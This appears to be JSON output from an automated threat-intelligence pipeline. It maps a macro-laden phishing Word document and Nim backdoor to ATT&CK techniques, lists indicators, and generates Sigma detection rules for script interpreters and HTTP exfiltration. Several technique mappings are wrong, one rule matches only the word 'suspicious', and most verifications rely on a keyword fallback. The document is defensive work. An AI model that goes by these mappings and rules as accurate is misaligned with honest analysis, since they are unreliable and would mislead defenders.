{
  "status": "success",
  "mode": "langchain",
  "extraction": {
    "status": "success",
    "extraction_summary": {
      "reports_processed": 1,
      "total_ttps_extracted": 24,
      "processing_time_ms": 0
    },
    "extraction_results": [
      {
        "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
        "extracted_ttps": [
          {
            "ttp_id": "6c3c91e6-dc10-4997-bb1c-1ca2bb096f08",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker uses a malicious Word document to drop a Nim backdoor, which is executed when the user enables macros.",
            "confidence_score": 0.703,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.62,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "e2a3edc708016316477228de885f0c39.doc",
              "OCu3HBg7gyI9aUaB.vbs",
              "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
            ],
            "tools": [
              "sc",
              "WMI",
              "Microsoft Word",
              "vbscript",
              "cmd",
              "wmi",
              "VBA",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "410c3aa4-a07a-49af-821e-e6c3d667e1c7",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "The attacker uses a malicious Word document that impersonates a Nepali government official to trick the user into enabling macros.",
            "confidence_score": 0.697,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.46,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "e2a3edc708016316477228de885f0c39.doc",
              "Nepali government official"
            ],
            "tools": [
              "sc",
              "WMI",
              "Microsoft Word",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f720db5c-b226-4502-97c2-b5d91cc9140f",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attacker uses VBA macros to execute commands and scripts, including the creation of VBScript files and batch scripts.",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd.exe",
              "C:\\Users\\<user>\\AppData\\Local\\8lGghf8kIPIuu3cM.bat"
            ],
            "tools": [
              "sc",
              "WMI",
              "base64",
              "vbscript",
              "cmd",
              "wmi",
              "VBA",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "cmd.exe"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a3b650a1-9b4a-4b4d-9c23-d58fe0bb8830",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "The attacker uses obfuscation techniques, such as password-protecting the VBA project and using the Chr() function, to evade detection.",
            "confidence_score": 0.694,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.437,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Chr() function",
              "password-protected VBA project"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "VBA",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ecbb78cc-5491-4544-b7b5-dd28fb742825",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Exfiltration Over Alternative Protocol",
            "attack_id": "T1567",
            "tactic": "Exfiltration",
            "description": "The attacker uses the Nim backdoor to exfiltrate data over an alternative protocol, such as HTTP.",
            "confidence_score": 0.689,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.405,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "Nim backdoor",
              "HTTP"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "Nim backdoor",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a3720c79-8e05-4801-80d5-d0488804bd8d",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Virtualization/Sandbox Evasion",
            "attack_id": "T1497",
            "tactic": "Defense Evasion",
            "description": "The attacker uses anti-analysis techniques, such as checking for analysis tools and terminating itself if detected.",
            "confidence_score": 0.683,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.368,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "tasklist.exe",
              "analysis tools"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "Nim backdoor",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "5fb1a667-df00-42f5-a322-c11ccf9750bd",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The attacker uses the Nim backdoor to gather information about the system, including the hostname.",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "hostname",
              "Nim backdoor"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "Nim backdoor",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2105d843-0ab6-4ca9-b4e5-f339f5532f7d",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "User Execution",
            "attack_id": "T1204",
            "tactic": "Execution",
            "description": "The attacker uses a VBscript to confirm an internet connection and run a batch file",
            "confidence_score": 0.68,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.345,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "OCu3HBg7gyI9aUaB.vbs",
              "8lGghf8kIPIuu3cM.bat"
            ],
            "tools": [
              "VBscript",
              "WMI",
              "sc",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "d1f9c629-4357-4dad-b371-9e481e5d342a",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Exfiltration Over Command and Control Channel",
            "attack_id": "T1041",
            "tactic": "Exfiltration",
            "description": "The attacker sends the execution result back to the server through a GET request",
            "confidence_score": 0.676,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.322,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "GET request",
              "C&C server"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "zip",
              "tasklist",
              "Ping",
              "net",
              "C&C server",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "388167f4-c676-4172-889a-c9913782e894",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "New Service",
            "attack_id": "T1050",
            "tactic": "Persistence",
            "description": "The attacker creates a scheduled task to attain persistent execution of the malware",
            "confidence_score": 0.673,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "ConsoleHostManager",
              "d.bat"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "Scheduled Task",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "ab961bdc-0c25-4c2a-aa4b-722a4234861d",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Registry Run Keys / Startup Folder",
            "attack_id": "T1060",
            "tactic": "Persistence",
            "description": "The attacker places a VBscript in the startup folder to retain access",
            "confidence_score": 0.669,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.276,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "OCu3HBg7gyI9aUaB.vbs",
              "Startup Folder"
            ],
            "tools": [
              "VBscript",
              "WMI",
              "sc",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "a748af4f-a5d1-4790-adff-8c5965cc1a33",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Modify Registry",
            "attack_id": "T1112",
            "tactic": "Persistence",
            "description": "The attacker creates a VBScript file in the startup folder to achieve persistence.",
            "confidence_score": 0.667,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.299,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\OCu3HBg7gyI9aUaB.vbs"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "VBA",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "47b066a8-362f-4cb0-a3d1-83321cb1a9e7",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Data from Local System",
            "attack_id": "T1005",
            "tactic": "Discovery",
            "description": "The attacker uses WMI's Win32_PingStatus class to ping a website",
            "confidence_score": 0.662,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "WMI",
              "Win32_PingStatus"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "14268f0c-2e3d-4f20-92f7-ad6b0b13a5a8",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "The attacker uses cmd /c to execute commands",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.58,
              "description_detail": 0.184,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "cmd /c",
              "conhost.exe"
            ],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "f29abad1-de16-4bbf-abfc-13e508c67dd3",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Application Window Discovery",
            "attack_id": "T1071",
            "tactic": "Discovery",
            "description": "The attacker uses the confectionary function to decrypt response data",
            "confidence_score": 0.656,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.54,
              "description_detail": 0.23,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.5
            },
            "indicators": [
              "confectionary function"
            ],
            "tools": [
              "sc",
              "WMI",
              "confectionary function",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "langchain_llm"
          },
          {
            "ttp_id": "2655cb93-a4de-466b-819a-db833ad78324",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Application Layer Protocol",
            "attack_id": "T1071",
            "tactic": "Command And Control",
            "description": "Detected Application Layer Protocol activity via NLP pattern matching",
            "confidence_score": 0.633,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.199,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "122a9a7e-b67b-409d-8a83-f12c79cea20c",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Command and Scripting Interpreter",
            "attack_id": "T1059",
            "tactic": "Execution",
            "description": "Detected Command and Scripting Interpreter activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9904e01d-23e9-4925-8b38-c591c077273a",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Obfuscated Files or Information",
            "attack_id": "T1027",
            "tactic": "Defense Evasion",
            "description": "Detected Obfuscated Files or Information activity via NLP pattern matching",
            "confidence_score": 0.631,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "a9aab504-5a9b-4139-a84a-b7ad290334d2",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Windows Management Instrumentation",
            "attack_id": "T1047",
            "tactic": "Execution",
            "description": "Detected Windows Management Instrumentation activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "265674f0-d4b6-4d2e-ba08-fc0ce29218ce",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Archive Collected Data",
            "attack_id": "T1560",
            "tactic": "Collection",
            "description": "Detected Archive Collected Data activity via NLP pattern matching",
            "confidence_score": 0.628,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.162,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "9f673502-8440-442f-aa57-8abfa2b82c9c",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Scheduled Task/Job",
            "attack_id": "T1053",
            "tactic": "Persistence",
            "description": "Detected Scheduled Task/Job activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "4d1af321-5308-42c3-af66-0223f5be5e58",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Screen Capture",
            "attack_id": "T1113",
            "tactic": "Collection",
            "description": "Detected Screen Capture activity via NLP pattern matching",
            "confidence_score": 0.624,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.139,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "58f63250-46e1-4c5f-b5dc-77720d00ca08",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "Phishing",
            "attack_id": "T1566",
            "tactic": "Initial Access",
            "description": "Detected Phishing activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.95,
              "ioc_evidence": 0.5,
              "description_detail": 0.116,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          },
          {
            "ttp_id": "547f5883-6592-4992-9e9c-3599d39c1b87",
            "report_id": "pdf-5921daf1ea71f8f5ff657c33a32493c9",
            "technique_name": "User Execution: Malicious File",
            "attack_id": "T1204.002",
            "tactic": "Execution",
            "description": "Detected User Execution: Malicious File activity via NLP pattern matching",
            "confidence_score": 0.621,
            "confidence_level": "medium",
            "confidence_breakdown": {
              "report_confidence": 0.8,
              "attack_mapping": 0.9,
              "ioc_evidence": 0.5,
              "description_detail": 0.185,
              "tool_mentions": 1.0,
              "context_richness": 0.54,
              "multiple_sources": 0.375
            },
            "indicators": [],
            "tools": [
              "sc",
              "WMI",
              "vbscript",
              "cmd",
              "wmi",
              "tasklist",
              "Ping",
              "net",
              "zip",
              "at",
              "apt",
              "base64"
            ],
            "extraction_method": "nlp_indicator"
          }
        ]
      }
    ]
  },
  "rules": {
    "rules": [
      {
        "title": "Suspicious Word Macro Behavior and Post-Exploitation Script Execution",
        "description": "Detects suspicious Word macro behavior and post-exploitation script execution related to the User Execution technique",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection1": {
            "Image": "C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE",
            "CommandLine|contains": "macros"
          },
          "selection2": {
            "ParentImage": "C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE",
            "Image|endswith": "cmd.exe"
          },
          "selection3": {
            "ParentImage": "C:\\Program Files\\Microsoft Office\\Root\\Office16\\WINWORD.EXE",
            "Image|endswith": "powershell.exe"
          },
          "selection4": {
            "Image|endswith": ".vbs"
          },
          "condition": "selection1 and (selection2 or selection3) or selection4"
        },
        "falsepositives": [
          "Legitimate Word macro execution",
          "Administrative script execution"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1566",
          "attack.user_execution"
        ],
        "ttp_id": "unknown",
        "technique_name": "User Execution",
        "generation_method": "langchain",
        "id": "984eebfc-2cce-480a-bc38-9515deeb5d58",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 192,
          "query_time_ms": 707.0
        }
      },
      {
        "title": "Phishing via Malicious Word Document",
        "description": "Detects phishing attempts using a malicious Word document that impersonates a Nepali government official to trick the user into enabling macros.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image": "WINWORD.EXE",
            "CommandLine|contains": "enable macros"
          },
          "selection2": {
            "ParentImage": "WINWORD.EXE",
            "Image": "cmd.exe"
          },
          "condition": "selection and selection2"
        },
        "falsepositives": [
          "Legitimate Word documents that require macros to be enabled",
          "Administrative tasks that involve enabling macros"
        ],
        "level": "medium",
        "tags": [
          "attack.t1566",
          "attack.initial_access"
        ],
        "ttp_id": "unknown",
        "technique_name": "Phishing",
        "generation_method": "langchain",
        "id": "a3bd5be4-8de6-4bc4-a53d-c2c397e7ad09",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 46,
          "query_time_ms": 504.0
        }
      },
      {
        "title": "Command and Scripting Interpreter Detection",
        "description": "Detects the use of command and scripting interpreters, such as cmd.exe, powershell.exe, and wscript.exe, to execute commands and scripts, including the creation of VBScript files and batch scripts.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe",
              "\\wscript.exe"
            ],
            "CommandLine|contains|all": [
              ".vbs",
              ".js",
              ".ps1",
              ".bat"
            ]
          },
          "selection2": {
            "ParentImage|endswith": [
              "\\WINWORD.EXE",
              "\\EXCEL.EXE",
              "\\OUTLOOK.EXE"
            ],
            "Image|endswith": [
              "\\cmd.exe",
              "\\powershell.exe"
            ]
          },
          "condition": "selection or selection2"
        },
        "falsepositives": [
          "Legitimate automation scripts",
          "Scripting by developers or administrators",
          "False positives may occur when legitimate applications use these interpreters for automation or scripting purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.execution",
          "attack.t1566",
          "car.2013-05-009"
        ],
        "ttp_id": "unknown",
        "technique_name": "Command and Scripting Interpreter",
        "generation_method": "langchain",
        "id": "b5fc4f09-b3dc-454c-8c43-93086f07e25c",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 74,
          "query_time_ms": 1290.0
        }
      },
      {
        "title": "Detection: Obfuscated Files or Information",
        "description": "The attacker uses obfuscation techniques, such as password-protecting the VBA project and using the Chr() function, to evade detection.",
        "logsource": {
          "category": "process_creation",
          "product": "windows"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "suspicious"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate administrative activity"
        ],
        "level": "medium",
        "tags": [
          "attack.unknown"
        ],
        "ttp_id": "unknown",
        "technique_name": "Obfuscated Files or Information",
        "generation_method": "fallback",
        "id": "536c7062-8d61-4499-8ffa-983bc9465809",
        "siem_verification": {
          "detected": false,
          "status": "success",
          "message": "Verification complete",
          "events_found": 0,
          "query_time_ms": 579.0
        }
      },
      {
        "title": "Exfiltration Over Alternative Protocol (Nim Backdoor)",
        "description": "Detects the use of the Nim backdoor to exfiltrate data over an alternative protocol, such as HTTP",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "CommandLine|contains": "http://",
            "ParentImage|not contains": "\\\\Code.exe"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate HTTP requests from non-malicious applications",
          "Developers using HTTP protocols for testing purposes"
        ],
        "level": "medium",
        "tags": [
          "attack.exfiltration",
          "attack.t1567"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Alternative Protocol",
        "generation_method": "langchain",
        "id": "7c73f0d6-3f9a-493b-93d2-883be74e4ca9",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 171,
          "query_time_ms": 495.0
        }
      },
      {
        "title": "Virtualization/Sandbox Evasion Detection",
        "description": "Detects potential virtualization/sandbox evasion techniques by monitoring for suspicious process creation and command line activity",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": [
              "\\tasklist.exe",
              "\\vboxservice.exe",
              "\\vmware.exe"
            ],
            "ParentImage|endswith": [
              "\\msiexec.exe",
              "\\rundll32.exe"
            ],
            "User|not": "NT AUTHORITY\\SYSTEM"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Software installation processes"
        ],
        "level": "medium",
        "tags": [
          "attack.defense_evasion",
          "attack.t1562"
        ],
        "ttp_id": "unknown",
        "technique_name": "Virtualization/Sandbox Evasion",
        "generation_method": "langchain",
        "id": "b03f4d51-fef5-46ae-b9b4-1fe402d06118",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 189,
          "query_time_ms": 470.00000000000006
        }
      },
      {
        "title": "Application Window Discovery via Nim Backdoor",
        "description": "Detects the use of the Nim backdoor to gather information about the system, including the hostname, which is a technique used for application window discovery.",
        "logsource": {
          "category": "process_creation",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "Image|endswith": "\nim.exe",
            "CommandLine|contains": "hostname"
          },
          "condition": "selection"
        },
        "falsepositives": [
          "Legitimate system administration tasks",
          "Software installation or updates that involve system information gathering"
        ],
        "level": "medium",
        "tags": [
          "attack.discovery",
          "attack.t1059",
          "attack.t1105"
        ],
        "ttp_id": "unknown",
        "technique_name": "Application Window Discovery",
        "generation_method": "langchain",
        "id": "4e413756-35e2-4873-af78-1ffb63d50903",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 4,
          "query_time_ms": 590.0
        }
      },
      {
        "title": "Exfiltration Over Command and Control Channel",
        "description": "Detects potential exfiltration of data over a command and control channel using HTTP GET requests",
        "logsource": {
          "category": "network_connection",
          "product": "windows",
          "service": "sysmon"
        },
        "detection": {
          "selection": {
            "HttpMethod": "GET",
            "Image": {
              "not": "svchost.exe"
            }
          },
          "filter": {
            "UriQuery": {
              "contains": [
                "base64",
                "encoded"
              ]
            }
          },
          "condition": "selection and filter"
        },
        "falsepositives": [
          "Legitimate web traffic",
          "Software updates"
        ],
        "level": "medium",
        "tags": [
          "attack.exfiltration",
          "attack.t1567"
        ],
        "ttp_id": "unknown",
        "technique_name": "Exfiltration Over Command and Control Channel",
        "generation_method": "langchain",
        "id": "b16d0e70-53dd-4c05-bf10-cb504c2cbd2d",
        "siem_verification": {
          "detected": true,
          "status": "success",
          "message": "Verification complete (via Keyword Fallback - Check Splunk Field Extractions)",
          "events_found": 4,
          "query_time_ms": 511.0
        }
